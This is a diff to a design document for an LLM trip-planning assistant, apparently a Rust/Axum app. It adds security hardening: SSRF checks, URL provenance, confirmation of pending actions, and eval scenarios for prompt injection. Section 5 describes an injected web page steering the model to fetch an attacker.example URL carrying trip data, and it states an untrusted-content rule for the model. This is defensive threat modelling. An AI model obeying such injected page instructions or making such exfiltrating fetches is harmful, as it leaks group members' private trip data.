@@ -18,7 +18,7 @@ changes.
 | App principle | Consequence for the assistant |
 |---|---|
 | Neutrality (no sponsored ranking) | The system prompt forbids promoting businesses. Web results are shown with their source. The deterministic `planner` stays the source of truth for itineraries and scores, and the LLM calls it rather than replacing it. |
-| Privacy (GDPR, nothing resold) | Only trip data goes to OpenRouter: no emails and no other members' identities (first names are replaced by "member A/B"). Requests set `provider.data_collection = "deny"` (and ZDR endpoints where available). Conversations go into the GDPR export, are deleted with the account and are disclosed in the UI. |
+| Privacy (GDPR, nothing resold) | Only trip data goes to OpenRouter: no emails and no other members' identities (first names are replaced by "member A/B" in structured fields; names typed inside free text such as review comments and notes are not scrubbed, and the privacy notice says so). Requests set `provider.data_collection = "deny"`, ZDR endpoints where available, and `provider.only` restricted to hosts covered by a data processing agreement, since GLM is served by several hosts in different jurisdictions. Conversations go into the GDPR export, are deleted with the account and are disclosed in the UI. |
 | Roles (`viewer < editor < organizer`) | The assistant acts **as the user**: it can never do more than the user can. A viewer gets a read-only assistant, plus their own review if they ask for it. |
 | Optimistic locking, real-time | Writes go through the existing routes, which keep the `version` checks, `Topic` notifications and rate limits. |
 | Explainability | Every assistant change is attributed ("Alex (assistant) a modifié les lieux") and every web-sourced note, link or photo keeps its source URL. |
@@ -38,8 +38,8 @@ LlmProvider trait ──► OpenRouter (GLM, …)                  │ tool call
                                                             ▼
                                   assistant::tools  ──►  in-process dispatch to the
                                   (allowlist, compact     existing Axum router
-                                   schemas, result         (same cookie, Origin, X-Client-Id
-                                   shrinking)              = "assistant:<conversation>")
+                                   schemas, result         (same cookie, Origin, ConnectInfo,
+                                   shrinking)              AssistantCall extension)
                                         │
                                         ├─► web_search / fetch_page (sub-calls, see §5)
                                         └─► photo download (SSRF-safe, see §4)
@@ -54,13 +54,25 @@ Business logic currently lives in the route handlers (validation, `require_role`
   large diff across about 50 routes, with a risk of drift.
 - **B. Recommended: in-process dispatch.** A tool builds an `http::Request` and sends it to the
   `Router` with `tower::ServiceExt::oneshot`. It carries the caller's session cookie, an allowed
-  `Origin` and `X-Client-Id: assistant:<conv>`. Permissions, validation, 409 conflicts, rate limits
-  and real-time events then behave exactly as if the user had clicked. Nothing is duplicated, and
-  a new route becomes a tool by adding one allowlist entry.
+  `Origin`, the original request's `ConnectInfo` (so `ClientIp` stays correct) and **no**
+  `X-Client-Id`, so every tab of the author refreshes too. Permissions, validation, 409 conflicts,
+  rate limits and real-time events then behave exactly as if the user had clicked. Nothing is
+  duplicated, and a new route becomes a tool by adding one allowlist entry.
 
-The router is built once (`api::app(state)`) and stored in `AppState` as a `OnceLock<Router>` to
-avoid a cycle. Responses are JSON, and the tool layer **shrinks** them before giving them to the
-model (§6).
+The router is built once by `api::app(state)` and handed to the assistant through an `Extension`
+layer added after it is built, not stored in `AppState`: an `AppState → Router → AppState` cycle
+would never be freed and would leak one router per `#[sqlx::test]`. Responses are JSON, and the
+tool layer **shrinks** them before giving them to the model (§6).
+
+**Attribution.** The dispatcher inserts an `AssistantCall { conversation_id }` request
+*extension* (not a header: extensions cannot be set by external clients, so it cannot be
+spoofed). `realtime::Actor` gains a `via_assistant: bool` field filled from it, which the UI
+renders as "Alex (assistant)".
+
+**Rate limits.** Tools share the user's per-minute limits (`places:{user}`, `itinerary:{user}`,
+`suggestions:{user}`, `wiki:{user}`…). A 429 is returned to the model as a short
+`rate_limited, retry in Ns` tool result and is never retried automatically inside the loop; flows
+that geocode many candidates (§5) batch them across turns.
 
 ### 2.2 `LlmProvider` trait (same pattern as `RoutingProvider` and `PlaceProvider`)
 
@@ -73,8 +85,8 @@ pub trait LlmProvider: Send + Sync {
 
 - `OpenRouter` implementation: `reqwest` (already a dependency), SSE parsing, no SDK. It sends
   `HTTP-Referer` and `X-Title` headers, `usage: {include: true}` (exact cost per call) and a
-  `provider` block (`data_collection: "deny"`, `sort`/`order`, and `require_parameters: true` so
-  every provider honours `tools`).
+  `provider` block (`data_collection: "deny"`, `only: [<hosts with a DPA>]`, `sort`/`order`, and
+  `require_parameters: true` so every provider honours `tools`).
 - `ScriptedLlm` for tests: it replays predefined turns (tool calls, then text). This lets the
   integration tests (`#[sqlx::test]`) cover the whole loop without network access.
 
@@ -89,17 +101,26 @@ AI_DAILY_BUDGET_USD=0.50       # per user
 AI_MAX_ROUNDS=8                # tool rounds per user message
 ```
 
-### 2.4 Data (migration `0014_assistant.sql`)
+### 2.4 Data (migration `0016_assistant.sql`; A1's enrichment tables come first as `0015_poi_enrichment.sql`)
 
 - `assistant_conversations (id, trip_id, user_id, title, model, summary, summary_upto, created_at, updated_at)`:
   private to the user, deleted with the trip, with the account and when the member leaves.
 - `assistant_messages (id, conversation_id, role, content jsonb, tool_name, tokens_in, tokens_out,
   cached_tokens, cost_usd, model, created_at)`: the full log for the UI and auditing. The model
   only ever sees a compacted view (§6).
-- `assistant_usage (user_id, day, cost_usd, tokens)`: enforces the daily budget (**429
-  `ai_budget_exceeded`**).
-- `assistant_pending_actions (id, conversation_id, tool, args jsonb, expires_at)`: actions that
-  need confirmation (§3.3).
+- `assistant_usage (user_id, day, cost_usd, reserved_usd, tokens)`: enforces the daily budget
+  (**429 `ai_budget_exceeded`**). Before each model call, an estimated maximum cost is
+  *reserved* with a conditional `UPDATE … WHERE cost_usd + reserved_usd + $est <= budget`, then
+  settled with the real `usage` cost. Two messages sent at once cannot both overspend.
+- `assistant_pending_actions (id, conversation_id, tool, args jsonb, expires_at, consumed_at)`:
+  actions that need confirmation (§3.3).
+
+### 2.5 Request lifetime
+
+The agent loop runs only inside the user's streaming request. If the browser disconnects, the loop
+stops before the next model call or tool round (a tool call already sent to the router completes;
+it is a normal, atomic route). Messages and tool results produced so far are saved, and the
+conversation shows "interrompu" with what was done.
 
 ---
 
@@ -147,17 +168,29 @@ creates a `pending_action`. The UI shows a card ("Supprimer 3 lieux ? Confirmer 
 confirming calls `POST …/assistant/actions/{id}/confirm`, which runs the stored call. This also
 makes prompt injection from web pages harmless for destructive actions.
 
+A pending action expires after 15 minutes, can be confirmed only once (`consumed_at` is set in
+the same transaction) and only by the conversation's owner. It runs through the same dispatcher,
+so the role is re-checked at confirmation time. The stored call keeps the `version` it was built
+against: if the place or itinerary changed meanwhile, the 409 is shown on the card ("modifié
+entre-temps") and the action is never silently retried against the new version.
+
 ---
 
 ## 4. Enrichment: notes, links and photos (useful without AI too)
 
-Today a place has a single `notes` field (2,000 chars) and one `website`. Add:
+Today a place has a single `notes` field (2,000 chars), one `website` and the OSM contact fields
+(`phone`, `email`, `wikidata`, `wikipedia`). Add (migration `0015_poi_enrichment.sql`):
 
 - `poi_notes (id, poi_id, author_id, via_assistant bool, body ≤ 4000, source_url?, created_at)`
 - `poi_links (id, poi_id, author_id, via_assistant, url https-only, title, kind ∈ {official,
   booking, article, video, map, other}, created_at)`, unique `(poi_id, url)`
 - `poi_photos (id, poi_id, author_id, via_assistant, storage_key, width, height, mime, bytes,
   source_url?, source_page?, author_credit?, license?, created_at)`, at most 20 per place
+
+**One home for notes.** The same migration copies every non-empty `pois.notes` into `poi_notes`
+(author = the place's creator when known, otherwise none) and the column is dropped once the UI
+reads only `poi_notes`. This avoids two competing note fields that the UI and the assistant
+would each pick differently. `website` stays as the place's main link, shown first.
 
 These get matching REST routes (`GET/POST/DELETE /trips/{t}/pois/{p}/notes|links|photos`) and UI
 sections in `PoiPanel`, so users get the feature too and the assistant tools simply dispatch to
@@ -166,8 +199,11 @@ author (same rule as places).
 
 **Photo pipeline** (`add_photo` and user uploads):
 1. Users upload multipart. The assistant gives a URL, which is downloaded server-side **with SSRF
-   protection**: https only, DNS resolved and private, loopback and link-local ranges refused,
-   no redirects to such addresses, 10 MB limit and 10 s timeout.
+   protection**: https only; the host is resolved once, private, loopback, link-local and other
+   non-public ranges (IPv4 and IPv6, including IPv4-mapped) are refused, and the connection is
+   made **to the checked IP** (`reqwest::ClientBuilder::resolve`) so a second DNS answer cannot
+   rebind it. Redirects are followed manually (at most 3), each hop re-checked the same way.
+   10 MB limit and 10 s timeout.
 2. The `image` crate decodes it (type sniffed, not trusted from headers), strips EXIF (GPS),
    re-encodes to WebP/JPEG at 1600 px plus a 400 px thumbnail.
 3. Storage sits behind a `PhotoStore` trait, with a local volume (`/data/photos`) in dev and an
@@ -193,7 +229,12 @@ There are two options on OpenRouter:
 - `fetch_page(url, question)`: a server fetch (same SSRF guard) followed by HTML-to-text
   conversion and a small-model extraction that answers only the question (opening hours, prices,
   phone, best season). It returns ≤ 200 tokens plus the URL. This is used to fill notes and
-  links accurately.
+  links accurately. **URL provenance:** `fetch_page` only accepts a URL that appeared in a
+  `web_search` result of this conversation, in the user's own message, or among the place's
+  saved links/website. Otherwise an injected page could make the model fetch
+  `https://attacker.example/?d=<trip snapshot>` and leak trip data through a read, which the
+  confirmation gate (§3.3) does not cover. Query strings are kept only when the URL matches its
+  source exactly.
 
 Typical flow for "find hidden waterfalls near La Fortuna":
 `suggestions(filter=nature, near)` (free, local OSM data) → `web_search` for blog and forum
@@ -202,6 +243,14 @@ mentions → `search_places` to geocode each candidate → proposal list in chat
 
 **Untrusted content**: every web result is wrapped in `<untrusted source="…">` in the tool result.
 The system prompt says it is data, never instructions, and §3.3 gates the destructive tools.
+
+Injection can still try to *write* (a phishing link or a fake note visible to the whole group
+under a member's name), so:
+- `add_link` / `add_photo` URLs and `add_note.source_url` follow the same provenance rule as
+  `fetch_page`: the model cannot invent or be fed a new URL.
+- Web-sourced links and photos are listed in the reply as a proposal ("Ajouter ces 3 liens ?"),
+  added on one click, like a pending action. Notes written by the assistant are added directly
+  but always show the source domain and the "assistant" badge, with one-click removal.
 
 ---
 
@@ -263,8 +312,9 @@ Target: **< 6k input tokens** for a typical turn on a 50-place trip, more than h
 - **Eval harness** (`backend/crates/api/tests/assistant_eval.rs`, `#[ignore]`, run manually with a
   real key) runs about 15 scripted scenarios on a seeded trip, for example: "add 3 restaurants near
   P7", "move Arenal to the 14th", "find a photo and opening hours for P1", "plan the itinerary",
-  "delete everything" (must ask for confirmation) and a prompt injection hidden in a fetched
-  page. It checks the resulting DB state and records success, rounds, tokens, cost and latency per
+  "delete everything" (must ask for confirmation) and prompt injections hidden in a fetched
+  page (one asking for a destructive action, one asking to fetch an attacker URL carrying trip
+  data, one asking to add a phishing link). It checks the resulting DB state and records success, rounds, tokens, cost and latency per
   model, so it doubles as a regression suite for prompt and tool changes.
 - Candidates after GLM: a fast and cheap model for `AI_MODEL_SMALL`, plus a stronger tool-calling
   model as a baseline. OpenRouter's "Exacto" routing variants are worth testing for tool-call
@@ -283,8 +333,8 @@ Target: **< 6k input tokens** for a typical turn on a 50-place trip, more than h
   budget, and a privacy notice ("les données du voyage sont envoyées à OpenRouter / Z.ai").
 - `PoiPanel`: new **Notes**, **Liens** and **Photos** sections (gallery with credit), with an
   "assistant" badge on AI-added items.
-- Real time: changes are attributed "X (assistant)". `X-Client-Id = assistant:<conv>` is never
-  equal to a tab id, so the author's own tabs refresh too.
+- Real time: changes are attributed "X (assistant)" from `Actor.via_assistant` (§2.1). Tool calls
+  carry no `X-Client-Id`, so the author's own tabs refresh too.
 - French strings in `i18n/fr.ts`.
 
 ---
@@ -295,9 +345,16 @@ Target: **< 6k input tokens** for a typical turn on a 50-place trip, more than h
   explicitly (the model asks to invite someone, and the call is refused).
 - The assistant uses the user's own session. A cookie is never stored for later use, and the
   loop only runs during the user's request.
-- SSRF guard for `fetch_page` and photo downloads. Size and time limits apply, plus an image
-  decoding check.
-- Web content is marked untrusted, and destructive actions need user confirmation.
+- SSRF guard for `fetch_page` and photo downloads, connecting to the checked IP and re-checking
+  every redirect. Size and time limits apply, plus an image decoding check.
+- URL provenance for `fetch_page`, `add_link`, `add_photo` and note sources (no exfiltration
+  through a read, no injected URLs written to the trip).
+- Web content is marked untrusted, destructive actions need user confirmation, and web-sourced
+  links and photos are proposed before being added.
+- Assistant attribution comes from a request extension set by the dispatcher, never from a
+  client header.
+- Pending actions expire, are single-use and are owner-only.
+- OpenRouter providers restricted to hosts covered by a DPA (`provider.only`).
 - Rate limits are 20 messages/min per user and 200/day, alongside the cost budget.
 - The OpenRouter key stays in env only, is never logged and is never sent to the frontend.
 - GDPR: conversations are exported and deleted with the account, and removed when the member
@@ -309,7 +366,7 @@ Target: **< 6k input tokens** for a typical turn on a 50-place trip, more than h
 
 | # | Content | Done when |
 |---|---|---|
-| A0 | `LlmProvider` + OpenRouter client, config, `ScriptedLlm`, eval harness skeleton | Hello-world tool call with GLM through the key; tests use the scripted provider |
+| A0 | `LlmProvider` + OpenRouter client, config, `ScriptedLlm`, eval harness skeleton; confirm the GLM model ID, its hosts (for `provider.only`) and current web-search pricing on OpenRouter | Hello-world tool call with GLM through the key; tests use the scripted provider |
 | A1 | Notes / links / photos: migration, REST, `PhotoStore`, SSRF-safe downloader, `PoiPanel` UI | Usable by people without AI; integration and UI tests |
 | A2 | Assistant core: conversations, SSE endpoint, agent loop, snapshot, aliases, **read tools** | Answers questions about the trip; budget and usage recorded |
 | A3 | **Write tools** through in-process dispatch, allowlist, confirmation flow, real-time attribution | Every user action except the excluded groups works from chat; viewer is read-only |
@@ -320,4 +377,5 @@ Open questions:
 - Should conversations stay private, or be shareable with the group?
 - Who pays for the assistant: the organizer's plan, or a budget per trip rather than per user?
 - Photo storage in production (S3-compatible provider, region for GDPR)?
-- Should the assistant reply only in French, or in the user's language?
+- Should the assistant reply only in French, or in the user's language? Recommendation: the
+  user's language (no extra constraint in the prompt; the UI chrome stays in French).
